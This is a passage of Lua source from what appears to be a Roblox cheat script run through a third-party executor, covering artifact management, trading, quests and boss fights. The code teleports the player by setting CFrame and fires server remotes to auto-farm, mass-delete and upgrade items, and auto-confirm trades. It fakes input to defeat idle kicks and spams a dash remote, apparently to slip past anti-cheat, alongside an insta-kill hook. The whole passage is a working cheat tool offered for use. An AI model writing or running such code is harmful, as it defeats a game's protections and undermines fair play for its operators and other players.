    function getMatches(d, ssFilter)
        local count = 0

        for _, sub in pairs(d.Substats or {})do
            if ssFilter[sub.Stat] then
                count = count + 1
            end
        end

        return count
    end

    if Toggles.ArtifactUpgrade and Toggles.ArtifactUpgrade.Value and data.Level < (Options.UpgradeLimit or 0) then
        if isWhitelisted(Options.Up_MS, data.MainStat.Stat) then
            actions.upgrade = true
        end
    end

    local lockMin = Options.Lock_MinSS or 0

    if Toggles.ArtifactLock and Toggles.ArtifactLock.Value and not data.Locked and data.Level >= (lockMin * 3) then
        if isWhitelisted(Options.Lock_MS, data.MainStat.Stat) and isWhitelisted(Options.Lock_Type, data.Category) and isWhitelisted(Options.Lock_Set, data.Set) then
            if getMatches(data, Options.Lock_SS or {}) >= lockMin then
                actions.lock = true
            end
        end
    end
    if not data.Locked and not actions.lock then
        if Toggles.DeleteUnlock and Toggles.DeleteUnlock.Value then
            actions.delete = true
        elseif Toggles.ArtifactDelete and Toggles.ArtifactDelete.Value then
            local typeMatch = filterStatus(Options.Del_Type, data.Category)
            local setMatch = filterStatus(Options.Del_Set, data.Set)
            local msFilter = Options['Del_MS_' .. data.Category] or {}
            local msMatch = filterStatus(msFilter, data.MainStat.Stat)
            local isTarget = typeMatch ~= false and setMatch ~= false

            if typeMatch == nil and setMatch == nil and msMatch == nil then
                isTarget = false
            end
            if isTarget then
                local trash = getMatches(data, Options.Del_SS or {})
                local minT = Options.Del_MinSS or 0
                local maxed = data.Level >= (Options.UpgradeLimit or 0)

                if msMatch == true or minT == 0 or (maxed and trash >= minT) then
                    actions.delete = true
                end
            end
        end
    end

    return actions
end
function AutoEquipArtifacts()
    if not (Toggles.ArtifactEquip and Toggles.ArtifactEquip.Value) then
        return
    end

    local best = {
        Helmet = nil,
        Gloves = nil,
        Body = nil,
        Boots = nil,
    }
    local scores = {
        Helmet = -1,
        Gloves = -1,
        Body = -1,
        Boots = -1,
    }
    local tTypes = Options.Eq_Type or {}
    local tMS = Options.Eq_MS or {}
    local tSS = Options.Eq_SS or {}

    function getMatches(d)
        local c = 0

        for _, s in pairs(d.Substats or {})do
            if tSS[s.Stat] then
                c = c + 1
            end
        end

        return c
    end
    function mainOK(d)
        if d.Category == 'Helmet' or d.Category == 'Gloves' then
            return true
        end

        return tMS[d.MainStat.Stat] == true
    end

    for uuid, data in pairs(Shared.ArtifactSession.Inventory)do
        if tTypes[data.Category] and mainOK(data) then
            local score = getMatches(data) * 10 + data.Level

            if score > scores[data.Category] then
                scores[data.Category] = score
                best[data.Category] = {
                    UUID = uuid,
                    Equipped = data.Equipped,
                }
            end
        end
    end
    for _, item in pairs(best)do
        if item and not item.Equipped then
            Remotes.ArtifactEquip:FireServer(item.UUID)
            task.wait(0.2)
        end
    end
end
function Func_ArtifactAutomation()
    while task.wait(5) do
        if not Shared.ArtifactSession.Inventory or not next(Shared.ArtifactSession.Inventory) then
            Remotes.ArtifactUnequip:FireServer('')
            task.wait(2)

            continue
        end

        local lockQ, delQ, upQ = {}, {}, {}

        for uuid, data in pairs(Shared.ArtifactSession.Inventory)do
            local res = EvaluateArtifact(uuid, data)

            if res.lock then
                table.insert(lockQ, uuid)
            end
            if res.delete then
                table.insert(delQ, uuid)
            end
            if res.upgrade then
                local lim = Options.UpgradeLimit or 0

                if Toggles.UpgradeStage and Toggles.UpgradeStage.Value then
                    lim = math.min(math.floor(data.Level / 3) * 3 + 3, lim)
                end

                table.insert(upQ, {
                    UUID = uuid,
                    Levels = lim,
                })
            end
        end
        for _, uuid in ipairs(lockQ)do
            Remotes.ArtifactLock:FireServer(uuid, true)
            task.wait(0.1)
        end

        if #delQ > 0 then
            for i = 1, #delQ, 50 do
                local chunk = {}

                for j = i, math.min(i + 49, #delQ)do
                    table.insert(chunk, delQ[j])
                end

                Remotes.MassDelete:FireServer(chunk)
                task.wait(0.6)
            end

            Remotes.ArtifactUnequip:FireServer('')
        end
        if #upQ > 0 then
            for i = 1, #upQ, 50 do
                local chunk = {}

                for j = i, math.min(i + 49, #upQ)do
                    table.insert(chunk, upQ[j])
                end

                Remotes.MassUpgrade:FireServer(chunk)
                task.wait(0.6)
            end
        end

        AutoEquipArtifacts()
    end
end
function Func_ArtifactMilestone()
    local m = 1

    while Toggles.ArtifactMilestone and Toggles.ArtifactMilestone.Value do
        Remotes.ArtifactClaim:FireServer(m)

        m = m >= 40 and 1 or m + 1

        task.wait(1)
    end
end
function OpenMerchantInterface()
    if isXeno then
        local npc = workspace:FindFirstChild('ServiceNPCs') and workspace.ServiceNPCs:FindFirstChild('MerchantNPC')
        local prompt = npc and npc:FindFirstChild('HumanoidRootPart') and npc.HumanoidRootPart:FindFirstChild('MerchantPrompt')

        if prompt then
            local char = GetCharacter()
            local root = char and char:FindFirstChild('HumanoidRootPart')

            if root then
                local old = root.CFrame

                root.CFrame = npc.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)

                task.wait(0.2)

                if Support.Proximity then
                    fireproximityprompt(prompt)
                else
                    prompt:InputHoldBegin()
                    task.wait(prompt.HoldDuration + 0.1)
                    prompt:InputHoldEnd()
                end

                task.wait(0.5)

                root.CFrame = old
            end
        end
    else
        if firesignal then
            firesignal(Remotes.OpenMerchant.OnClientEvent)
        elseif getconnections then
            for _, v in pairs(getconnections(Remotes.OpenMerchant.OnClientEvent))do
                if v.Function then
                    task.spawn(v.Function)
                end
            end
        end
    end
end
function Func_AutoTrade()
    while task.wait(0.5) do
        local inTrade = PGui:FindFirstChild('InTradingUI') and PGui.InTradingUI.MainFrame.Visible
        local reqUI = PGui:FindFirstChild('TradeRequestUI') and PGui.TradeRequestUI.TradeRequest.Visible

        if Toggles.ReqTradeAccept and Toggles.ReqTradeAccept.Value and reqUI then
            Remotes.TradeRespond:FireServer(true)
            task.wait(1)
        end
        if Toggles.ReqTrade and Toggles.ReqTrade.Value and not inTrade and not reqUI then
            local target = Options.SelectedTradePlr

            if target and typeof(target) == 'Instance' then
                Remotes.TradeSend:FireServer(target.UserId)
                task.wait(3)
            end
        end
        if inTrade and Toggles.AutoAccept and Toggles.AutoAccept.Value then
            local sel = Options.SelectedTradeItems or {}
            local toAdd = {}

            for itemName, on in pairs(sel)do
                if on then
                    local already = false

                    if Shared.TradeState.myItems then
                        for _, ti in pairs(Shared.TradeState.myItems)do
                            if ti.name == itemName then
                                already = true

                                break
                            end
                        end
                    end
                    if not already then
                        table.insert(toAdd, itemName)
                    end
                end
            end

            if #toAdd > 0 then
                for _, name in ipairs(toAdd)do
                    local qty = 0

                    for _, item in pairs(Shared.Cached_Inv or {})do
                        if item.name == name then
                            qty = item.quantity

                            break
                        end
                    end

                    if qty > 0 then
                        Remotes.TradeAddItem:FireServer('Items', name, qty)
                        task.wait(0.5)
                    end
                end
            else
                if not Shared.TradeState.myReady then
                    Remotes.TradeReady:FireServer(true)
                elseif Shared.TradeState.myReady and Shared.TradeState.theirReady then
                    if Shared.TradeState.phase == 'confirming' and not Shared.TradeState.myConfirm then
                        Remotes.TradeConfirm:FireServer()
                    end
                end
            end
        end
    end
end
function Func_AutoChest()
    while task.wait(2) do
        if not (Toggles.AutoChest and Toggles.AutoChest.Value) then
            break
        end

        local sel = Options.SelectedChests or {}

        for _, r in ipairs(Tables.Rarities)do
            if sel[r] then
                local fullName = (r == 'Aura Crate') and 'Aura Crate' or (r .. ' Chest')

                pcall(function()
                    Remotes.UseItem:FireServer('Use', fullName, 10000)
                end)
                task.wait(1)
            end
        end
    end
end
function Func_AutoCraft()
    while task.wait(1) do
        if not (Toggles.AutoCraftItem and Toggles.AutoCraftItem.Value) then
            break
        end

        local sel = Options.SelectedCraftItems or {}

        for _, item in pairs(Shared.Cached_Inv or {})do
            if sel.DivineGrail and item.name == 'Broken Sword' and item.quantity >= 3 then
                pcall(function()
                    Remotes.GrailCraft:InvokeServer('DivineGrail', math.min(math.floor(item.quantity / 3), 99))
                end)
                task.wait(0.5)
            end
            if sel.SlimeKey and item.name == 'Slime Shard' and item.quantity >= 2 then
                pcall(function()
                    Remotes.SlimeCraft:InvokeServer('SlimeKey', math.min(math.floor(item.quantity / 2), 99))
                end)
            end
        end
    end
end
function GetFormattedItemSections(src, isNew)
    local cats = {
        Chests = {},
        Rerolls = {},
        Keys = {},
        Materials = {},
        Gears = {},
        Accessories = {},
        Runes = {},
        Others = {},
    }
    local chestOrder = {
        'Common',
        'Rare',
        'Epic',
        'Legendary',
        'Mythical',
        'Secret',
        'Aura Crate',
        'Cosmetic Crate',
    }
    local matOrder = {
        Wood = 1,
        Iron = 2,
        Obsidian = 3,
        Mythril = 4,
        Adamantite = 5,
    }
    local rarOrder = {
        Common = 1,
        Rare = 2,
        Epic = 3,
        Legendary = 4,
    }
    local gearOrder = {
        Helmet = 1,
        Gloves = 2,
        Body = 3,
        Boots = 4,
    }
    local totalDust = 0

    for key, data in pairs(src)do
        local name, qty

        if type(data) == 'table' and data.name then
            name = tostring(data.name)
            qty = tonumber(data.quantity) or 1
        else
            name = tostring(key)
            qty = tonumber(data) or 1
        end
        if name:find('Auto%-deleted') then
            local dv = name:match('%+(%d+) dust')

            if dv then
                totalDust = totalDust + (qty * tonumber(dv))
            end

            continue
        end

        local totalInv = 0

        if isNew then
            for _, item in pairs(Shared.Cached_Inv or {})do
                if item.name == name then
                    totalInv = item.quantity

                    break
                end
            end
        end

        local txt = isNew and string.format('+ [%d] %s [Total: %s]', qty, name, CommaFormat(totalInv)) or string.format('- %s: %s', name, CommaFormat(qty))

        if name:find('Chest') or name == 'Aura Crate' or name == 'Cosmetic Crate' then
            local w = 99

            for i, v in ipairs(chestOrder)do
                if name:find(v) then
                    w = i

                    break
                end
            end

            table.insert(cats.Chests, {
                Text = txt,
                Weight = w,
            })
        elseif name:find('Reroll') then
            table.insert(cats.Rerolls, txt)
        elseif name:find('Key') then
            table.insert(cats.Keys, txt)
        elseif matOrder[name] then
            table.insert(cats.Materials, {
                Text = txt,
                Weight = matOrder[name],
            })
        elseif name:find('Helmet') or name:find('Gloves') or name:find('Body') or name:find('Boots') then
            local rw, tw = 99, 99

            for k, v in pairs(rarOrder)do
                if name:find(k) then
                    rw = v

                    break
                end
            end
            for k, v in pairs(gearOrder)do
                if name:find(k) then
                    tw = v

                    break
                end
            end

            table.insert(cats.Gears, {
                Text = txt,
                Rarity = rw,
                Type = tw,
            })
        elseif name:find('Rune') then
            table.insert(cats.Runes, txt)
        else
            table.insert(cats.Others, txt)
        end
    end

    if totalDust > 0 then
        local dt = isNew and string.format('+ [%d] Dust', totalDust) or string.format('- Dust: %s', CommaFormat(totalDust))

        table.insert(cats.Materials, 1, {
            Text = dt,
            Weight = 0,
        })
    end

    local result = ''

    function proc(title, tbl, sortFunc)
        if #tbl > 0 then
            if sortFunc then
                table.sort(tbl, sortFunc)
            end

            result = result .. '**< ' .. title .. ' >**\n```'

            for _, v in ipairs(tbl)do
                result = result .. (type(v) == 'table' and v.Text or v) .. '\n'
            end

            result = result .. '```\n'
        end
    end

    proc('Chests', cats.Chests, function(a, b)
        return a.Weight < b.Weight
    end)
    proc('Rerolls', cats.Rerolls)
    proc('Keys', cats.Keys)
    proc('Materials', cats.Materials, function(a, b)
        return a.Weight < b.Weight
    end)
    proc('Gears', cats.Gears, function(a, b)
        return a.Rarity ~= b.Rarity and a.Rarity < b.Rarity or a.Type < b.Type
    end)
    proc('Runes', cats.Runes)
    proc('Others', cats.Others)

    return result
end
function UniversalPuzzleSolver(puzzleType)
    local moduleMap = {
        Dungeon = RS.Modules:FindFirstChild('DungeonConfig'),
        Slime = RS.Modules:FindFirstChild('SlimePuzzleConfig'),
        Demonite = RS.Modules:FindFirstChild('DemoniteCoreQuestConfig'),
        Hogyoku = RS.Modules:FindFirstChild('HogyokuQuestConfig'),
    }
    local hogyokuOrder = {
        'Snow',
        'Shibuya',
        'HuecoMundo',
        'Shinjuku',
        'Slime',
        'Judgement',
    }
    local mod = moduleMap[puzzleType]

    if not mod then
        return
    end

    local data = require(mod)
    local settings = data.PuzzleSettings or data.PieceSettings
    local pieces = data.Pieces or settings.IslandOrder
    local pieceName = settings and settings.PieceModelName or 'DungeonPuzzlePiece'

    UI:Notify({
        Title = 'Puzzle',
        Description = 'Starting ' .. puzzleType .. '...',
        Duration = 5,
    })

    for i, islandOrPiece in ipairs(pieces)do
        local tpTarget

        if puzzleType == 'Demonite' then
            tpTarget = 'Academy'
        elseif puzzleType == 'Hogyoku' then
            tpTarget = hogyokuOrder[i]
        else
            tpTarget = islandOrPiece:gsub('Island', ''):gsub('Station', '')

            if islandOrPiece == 'HuecoMundo' then
                tpTarget = 'HuecoMundo'
            end
        end
        if tpTarget then
            Remotes.TP_Portal:FireServer(tpTarget)
            task.wait(2.5)
        end

        local piece

        if puzzleType == 'Demonite' or puzzleType == 'Hogyoku' then
            piece = workspace:FindFirstChild(islandOrPiece, true)
        else
            local folder = workspace:FindFirstChild(islandOrPiece)

            piece = (folder and folder:FindFirstChild(pieceName, true)) or workspace:FindFirstChild(pieceName, true)
        end
        if piece then
            HybridMove(piece:GetPivot() * CFrame.new(0, 3, 0))
            task.wait(0.5)

            local prompt = piece:FindFirstChildOfClass('ProximityPrompt') or piece:FindFirstChild('ProximityPrompt', true)

            if prompt then
                fireproximityprompt(prompt)
                UI:Notify({
                    Title = 'Puzzle',
                    Description = string.format('Piece %d/%d collected', i, #pieces),
                    Duration = 2,
                })
                task.wait(1.5)
            else
                UI:Notify({
                    Title = 'Puzzle',
                    Description = 'No prompt on piece ' .. i,
                    Duration = 3,
                })
            end
        else
            UI:Notify({
                Title = 'Puzzle',
                Description = 'Piece ' .. i .. ' not found on ' .. tostring(tpTarget),
                Duration = 3,
            })
        end
    end

    UI:Notify({
        Title = 'Puzzle',
        Description = puzzleType .. ' completed!',
        Duration = 5,
    })
end
function FireSkillsWithPositionLock()
    if not (Toggles.AutoSkill and Toggles.AutoSkill.Value) then
        return
    end

    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')
    local tool = char and char:FindFirstChildOfClass('Tool')

    if not (tool and root) then
        return
    end

    local savedCF = root.CFrame
    local keyToSlot = {
        Z = 1,
        X = 2,
        C = 3,
        V = 4,
        F = 5,
    }
    local keyToEnum = {
        Z = Enum.KeyCode.Z,
        X = Enum.KeyCode.X,
        C = Enum.KeyCode.C,
        V = Enum.KeyCode.V,
        F = Enum.KeyCode.F,
    }
    local toolType = GetToolTypeFromModule(tool.Name)
    local selected = Options.SelectedSkills or {}

    if Toggles.AutoSkill_BossOnly and Toggles.AutoSkill_BossOnly.Value then
        local target = Shared.Target

        if not target or not target.Parent then
            return
        end

        local n = target.Name:lower():gsub('%s+', ''):gsub('_', '')
        local bossHP = target:GetAttribute('_BossHP') or target:GetAttribute('BossHP')
        local hum = target:FindFirstChildOfClass('Humanoid')
        local isBoss = false
        local bossKeywords = {
            'boss',
            'greatmage',
            'theworld',
            'cosmicbeing',
            'kraken',
            'seaserpent',
            'seabeast',
            'seadragon',
            'rimuru',
            'anos',
            'trueaizen',
            'strongest',
            'jinwoo',
            'alucard',
            'gojo',
            'sukuna',
            'gilgamesh',
            'moonslayer',
            'saberalter',
            'blessedmaiden',
            'qinshi',
            'dio',
            'yuji',
            'ichigo',
            'aizen',
            'dragon',
            'shadow',
        }

        for _, kw in ipairs(bossKeywords)do
            if n:find(kw, 1, true) then
                isBoss = true

                break
            end
        end

        if not isBoss and bossHP and tonumber(bossHP) then
            isBoss = true
        end
        if not isBoss and hum and hum.MaxHealth >= 500000 then
            isBoss = true
        end
        if not isBoss then
            return
        end
    end

    for _, key in ipairs({
        'Z',
        'X',
        'C',
        'V',
        'F',
    })do
        if selected[key] and IsSkillReady(key) then
            pcall(function()
                if toolType == 'Power' then
                    Remotes.UseFruit:FireServer('UseAbility', {
                        FruitPower = tool.Name:gsub(' Fruit', ''),
                        KeyCode = keyToEnum[key],
                    })
                else
                    Remotes.UseSkill:FireServer(keyToSlot[key])
                end
            end)
            task.wait(0.1)

            if root and root.Parent then
                root.CFrame = savedCF
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end
end
function AutoQuestlineLoop()
    while Toggles.AutoQuestline and Toggles.AutoQuestline.Value do
        task.wait(0.1)

        local selId = Options.SelectedQuestline

        if not selId then
            continue
        end

        local qData = Modules.Quests.Questlines[selId]

        if not qData then
            continue
        end

        local questUI = PGui.QuestUI.Quest
        local isMatchingStage = false

        for _, stage in ipairs(qData.stages)do
            if stage.title == questUI.Quest.Holder.Content.QuestInfo.QuestTitle.QuestTitle.Text then
                isMatchingStage = true

                break
            end
        end

        if not questUI.Visible or not isMatchingStage then
            Remotes.QuestAccept:FireServer(qData.npcName)
            task.wait(1.5)

            continue
        end

        local curStage = nil

        for _, stage in ipairs(qData.stages)do
            if stage.title == questUI.Quest.Holder.Content.QuestInfo.QuestTitle.QuestTitle.Text then
                curStage = stage

                break
            end
        end

        if curStage then
            local tt = curStage.trackingType

            if tt:find('Kills') and not tt:find('Boss') and tt ~= 'PlayerKills' then
                local mobName = tt:gsub('Kills', '')

                if mobName == 'AnyNPC' then
                    if Toggles.LevelFarm then
                        Toggles.LevelFarm.Value = true
                    end
                else
                    Options.SelectedMob = {[mobName] = true}

                    if Toggles.MobFarm then
                        Toggles.MobFarm.Value = true
                    end
                end
            elseif tt:find('BossKills') or tt == 'AnyBossKills' then
                if tt == 'AnyBossKills' then
                    if Toggles.AllBossesFarm then
                        Toggles.AllBossesFarm.Value = true
                    end
                end
            end
        end
    end
end

task.spawn(function()
    DisableIdled()

    while true do
        task.wait(60)

        if Toggles.AntiAFK and Toggles.AntiAFK.Value then
            pcall(function()
                VirtualUser:CaptureController()
                VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                task.wait(0.2)
                VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            end)
        end
    end
end)

local _DR = GetRemote(RS, 'RemoteEvents.DashRemote')
local _FS = _DR and _DR.FireServer

function ACThing(state)
    if Connections.Dash then
        Connections.Dash:Disconnect()
    end
    if not (state and _DR and _FS) then
        return
    end

    Connections.Dash = RunService.Heartbeat:Connect(function()
        task.spawn(function()
            pcall(_FS, _DR, vector.create(0, 0, 0), 0, false)
        end)
    end)
end
function GetItemQty(itemName)
    if not Shared.Cached_Inv then
        return 0
    end

    local qty = 0

    for _, item in pairs(Shared.Cached_Inv)do
        if item.name == itemName then
            qty = qty + (item.quantity or 1)
        end
    end

    return qty
end
function FindBossByKeyword(keyword)
    for _, npc in pairs(PATH.Mobs:GetChildren())do
        if npc.Name:lower():find(keyword:lower()) then
            local hum = npc:FindFirstChildOfClass('Humanoid')

            if hum and hum.Health > 0 then
                return npc
            end
        end
    end

    return nil
end
function FireQuestSkills(isBoss)
    local keys = isBoss and {
        {
            key = 'Z',
            slot = 1,
        },
        {
            key = 'X',
            slot = 2,
        },
        {
            key = 'C',
            slot = 3,
        },
        {
            key = 'V',
            slot = 4,
        },
        {
            key = 'F',
            slot = 5,
        },
    } or {
        {
            key = 'Z',
            slot = 1,
        },
        {
            key = 'X',
            slot = 2,
        },
        {
            key = 'C',
            slot = 3,
        },
        {
            key = 'V',
            slot = 4,
        },
    }
    local char = GetCharacter()
    local tool = char and char:FindFirstChildOfClass('Tool')

    if not tool then
        return
    end

    local toolType = GetToolTypeFromModule(tool.Name)

    for _, keyData in ipairs(keys)do
        if IsSkillReady(keyData.key) then
            pcall(function()
                if toolType == 'Power' then
                    Remotes.UseFruit:FireServer('UseAbility', {
                        FruitPower = tool.Name:gsub(' Fruit', ''),
                        KeyCode = ({
                            Z = Enum.KeyCode.Z,
                            X = Enum.KeyCode.X,
                            C = Enum.KeyCode.C,
                            V = Enum.KeyCode.V,
                            F = Enum.KeyCode.F,
                        })[keyData.key],
                    })
                else
                    Remotes.UseSkill:FireServer(keyData.slot)
                end
            end)
            task.wait(0.1)
        end
    end
end
function GetQuestProgressUI()
    local cur, max = 0, 0
    local QuestUI = PGui:FindFirstChild('QuestUI')

    if QuestUI then
        for _, lbl in pairs(QuestUI:GetDescendants())do
            if lbl:IsA('TextLabel') and lbl.Text ~= '' then
                local c, m = lbl.Text:match('(%d+)/(%d+)')

                if c and m then
                    cur = tonumber(c) or 0
                    max = tonumber(m) or 0

                    break
                end
            end
        end
    end

    return cur, max
end
function SafeTPToPos(x, y, z)
    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if not root then
        return
    end

    root.CFrame = CFrame.new(x, y, z)
    root.AssemblyLinearVelocity = Vector3.zero
end
function FindNPC(name, searchWorkspace)
    local key = name:lower():gsub('%s+', ''):gsub('_', '')

    for _, npc in pairs(PATH.Mobs:GetChildren())do
        if npc:IsA('Model') then
            local n = npc.Name:lower():gsub('%s+', ''):gsub('_', '')

            if n:find(key, 1, true) or key:find(n, 1, true) then
                if IsAlive(npc) then
                    return npc
                end
            end
        end
    end

    if searchWorkspace then
        for _, obj in pairs(workspace:GetDescendants())do
            if obj:IsA('Model') then
                local n = obj.Name:lower():gsub('%s+', ''):gsub('_', '')

                if n:find(key, 1, true) or key:find(n, 1, true) then
                    if IsAlive(obj) then
                        return obj
                    end
                end
            end
        end
    end

    return nil
end
function FindBestMob(name)
    return GetBestMobCluster({[name] = true})
end
function IsAlive(npc)
    return IsValidTarget(npc)
end
function SummonAndKill(displayName, diff, island)
    diff = diff or 'Normal'

    if not FindNPC(displayName, true) then
        FireBossRemote(displayName, diff)
        task.wait(3)
    end

    local target = FindNPC(displayName, true)

    if target and IsAlive(target) then
        AttackTarget(target, island or Shared.BossTIMap[displayName] or GetNearestIsland(target:GetPivot().Position), 'Boss')

        return true
    end

    FireBossRemote(displayName, diff or 'Normal')
    task.wait(3)

    target = FindNPC(displayName, true)

    if target and IsAlive(target) then
        AttackTarget(target, island or Shared.BossTIMap[displayName] or GetNearestIsland(target:GetPivot().Position), 'Boss')

        return true
    end

    return false
end
function BossFarmLoop(bossName, diff, island, toggleKey)
    local lastSummon = 0

    while(not toggleKey or (Toggles[toggleKey] and Toggles[toggleKey].Value)) and not (Shared.BossFarmStopCondition and Shared.BossFarmStopCondition()) do
        task.wait(0.05)

        local target = FindNPC(bossName, true)

        if target and IsAlive(target) then
            AttackTarget(target, island or Shared.BossTIMap[bossName] or GetNearestIsland(target:GetPivot().Position), 'Boss')
        elseif tick() - lastSummon >= 3 then
            FireBossRemote(bossName, diff or 'Normal')

            lastSummon = tick()
        end
    end
end
function TeleportToPos(pos, offset)
    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if not root then
        return
    end

    offset = offset or Vector3.new(0, 3, 0)
    root.CFrame = CFrame.new(pos + offset)
    root.AssemblyLinearVelocity = Vector3.zero
end
function TeleportToIsland(islandName, waitTime)
    Remotes.TP_Portal:FireServer(islandName)
    task.wait(waitTime or 2.5)
end
function GetItemCount(itemName)
    if not Shared.Cached_Inv then
        return 0
    end

    local qty = 0

    for _, item in pairs(Shared.Cached_Inv)do
        if item.name == itemName then
            qty = qty + (item.quantity or 1)
        end
    end

    return qty
end
function HasAllItems(requirements)
    for _, req in ipairs(requirements)do
        if GetItemCount(req.name) < req.need then
            return false
        end
    end

    return true
end
function Notify(title, msg, duration)
    UI:Notify({
        Title = title,
        Description = msg,
        Duration = duration or 4,
    })
end
function AutoFarmForItems(config)
    if HasAllItems(config.requirements) then
        Notify(config.notifyTitle or 'Farm', 'Already have all items!', 4)

        return true
    end

    TeleportToIsland(config.island)

    local lastNotif = 0
    local toggleKey = config.toggleKey

    Shared.BossFarmStopCondition = function()
        if HasAllItems(config.requirements) then
            return true
        end
        if tick() - lastNotif >= 5 then
            local lines = {}

            for _, req in ipairs(config.requirements)do
                table.insert(lines, req.name .. ': ' .. GetItemCount(req.name) .. '/' .. req.need)
            end

            Notify(config.notifyTitle or 'Farming', table.concat(lines, '\n'), 4)

            lastNotif = tick()
        end

        return false
    end

    BossFarmLoop(config.bossName, config.diff or 'Normal', config.island, toggleKey)

    Shared.BossFarmStopCondition = nil

    if not (not toggleKey or (Toggles[toggleKey] and Toggles[toggleKey].Value)) then
        return false
    end
    if not HasAllItems(config.requirements) then
        return false
    end
    if config.buyNpcName then
        Notify(config.notifyTitle or 'Done', 'All items! Buying from NPC...', 4)
        TeleportToIsland(config.island)
        SafeTeleportToNPC(config.buyNpcName)
        task.wait(1)

        if config.buyRemoteKey then
            pcall(function()
                Remotes.MerchantBuy:InvokeServer(config.buyRemoteKey, 1)
            end)
        end
    end

    return true
end
function AttackTarget(target, island, farmType)
    if not target or not target.Parent then
        return
    end
    if not IsAlive(target) then
        return
    end

    farmType = farmType or 'Mob'
    island = island or GetNearestIsland(target:GetPivot().Position)
    Shared.Target = target
    Shared.TargetValid = true

    EquipWeapon()
    ExecuteFarmLogic(target, island, farmType)
    pcall(function()
        Remotes.M1:FireServer()
    end)

    Shared.LastM1 = time()

    FireSkillsWithPositionLock()
    TryInstaKill(target)
end
function BurstM1OnTarget(target, burstCount, burstDelay)
    burstCount = burstCount or 5
    burstDelay = burstDelay or 0.04

    for i = 1, burstCount do
        if not IsAlive(target) then
            break
        end

        pcall(function()
            Remotes.M1:FireServer()
        end)

        Shared.LastM1 = time()

        task.wait(burstDelay)
    end
end
function BurstM1(burstCount, burstDelay)
    burstCount = burstCount or 5
    burstDelay = burstDelay or 0

    for i = 1, burstCount do
        pcall(function()
            Remotes.M1:FireServer()
        end)

        Shared.LastM1 = time()

        if burstDelay > 0 then
            task.wait(burstDelay)
        end
    end
end
function RunItemFarmAndDisable(toggleKey, config)
    AutoFarmForItems(config)

    if Toggles[toggleKey] then
        Toggles[toggleKey].Value = false
    end
end
function Func_AutoGojoQuest()
    EquipWeapon()
    task.wait(0.5)

    local QuestUI = PGui:WaitForChild('QuestUI')
    local QuestFrame = QuestUI:WaitForChild('Quest'):WaitForChild('Quest')
    local QuestInfo = QuestFrame:WaitForChild('Holder'):WaitForChild('Content'):WaitForChild('QuestInfo')
    local QuestTitle = QuestInfo:WaitForChild('QuestTitle'):WaitForChild('QuestTitle')
    local QuestDesc = QuestInfo:WaitForChild('QuestDescription')
    local lastBossHP = math.huge

    function GetTitle()
        return QuestTitle and QuestTitle.Text or ''
    end
    function GetDesc()
        return QuestDesc and QuestDesc.Text or ''
    end
    function IsVisible()
        return QuestFrame and QuestFrame.Visible
    end
    function IsDone()
        local c, m = GetQuestProgressUI()

        c = tonumber(c) or 0
        m = tonumber(m) or 0

        return m > 0 and c >= m
    end
    function WaitAtSpawn()
        SafeTeleportToNPC('GojoMovesetNPC')
        task.wait(3)
    end

    Remotes.QuestAbandon:FireServer()
    task.wait(0.5)
    Remotes.QuestAccept:FireServer('GojoMovesetNPC')
    task.wait(1.5)
    UI:Notify({
        Title = 'Gojo Quest',
        Description = 'Quest started!',
        Duration = 3,
    })

    while Toggles.AutoGojoQuest and Toggles.AutoGojoQuest.Value do
        task.wait(0.05)

        if not IsVisible() then
            Remotes.QuestAbandon:FireServer()
            task.wait(0.5)
            Remotes.QuestAccept:FireServer('GojoMovesetNPC')
            task.wait(1.5)

            continue
        end

        local titleLow = GetTitle():lower()
        local descLow = GetDesc():lower()
        local cur, max = GetQuestProgressUI()

        cur = tonumber(cur) or 0
        max = tonumber(max) or 0

        if (titleLow:find('training 1') or descLow:find('kill')) and not descLow:find('boss') then
            if IsDone() then
                UI:Notify({
                    Title = 'Gojo Quest',
                    Description = 'Stage 1 done!',
                    Duration = 3,
                })
                task.wait(1)

                continue
            end

            local t = GetNearestMobTarget()

            if not t then
                WaitAtSpawn()

                continue
            end

            AttackTarget(t, GetNearestIsland(t:GetPivot().Position), 'Mob')
        elseif descLow:find('ability') or descLow:find('use') or titleLow:find('training 2') then
            if IsDone() then
                UI:Notify({
                    Title = 'Gojo Quest',
                    Description = 'Stage 2 done!',
                    Duration = 3,
                })
                task.wait(1)

                continue
            end

            local t = GetNearestMobTarget()

            if not t then
                WaitAtSpawn()

                continue
            end

            AttackTarget(t, GetNearestIsland(t:GetPivot().Position), 'Mob')
        elseif descLow:find('gojo') or descLow:find('boss') or titleLow:find('training 3') then
            if IsDone() then
                UI:Notify({
                    Title = 'Gojo Quest',
                    Description = 'All stages done! Buy Gojo style.',
                    Duration = 8,
                })

                if Toggles.AutoGojoQuest then
                    Toggles.AutoGojoQuest.Value = false
                end

                break
            end

            local boss = GetBestMobCluster({GojoBoss = true})

            if boss then
                local hum = boss:FindFirstChildOfClass('Humanoid')
                local curHP = hum and hum.Health or 0

                if curHP <= 0 and lastBossHP > 0 then
                    UI:Notify({
                        Title = 'Gojo Quest',
                        Description = 'Boss killed! ' .. cur .. '/' .. max,
                        Duration = 3,
                    })

                    lastBossHP = math.huge

                    task.wait(2)

                    continue
                end

                lastBossHP = curHP

                AttackTarget(boss, 'Shibuya', 'Boss')
            else
                lastBossHP = math.huge

                UI:Notify({
                    Title = 'Gojo Quest',
                    Description = 'Waiting for GojoBoss... (' .. cur .. '/' .. max .. ')',
                    Duration = 4,
                })
                WaitAtSpawn()
            end
        else
            UI:Notify({
                Title = 'Gojo Quest',
                Description = 'Unknown stage: ' .. GetTitle() .. '\n' .. GetDesc(),
                Duration = 4,
            })
            task.wait(2)
        end
    end
end
function Func_AutoSukunaQuest()
    local wasInstaKill = Toggles.InstaKill and Toggles.InstaKill.Value
    local wasInstaKillHP = Options.InstaKillMinHP

    Toggles.InstaKill = {Value = false}
    Options.InstaKillMinHP = 0

    function RestoreState()
        Toggles.InstaKill = {Value = wasInstaKill}
        Options.InstaKillMinHP = wasInstaKillHP
    end
    function WaitAtSpawn()
        SafeTeleportToNPC('SukunaMovesetNPC')
        task.wait(3)
    end

    EquipWeapon()
    task.wait(0.5)

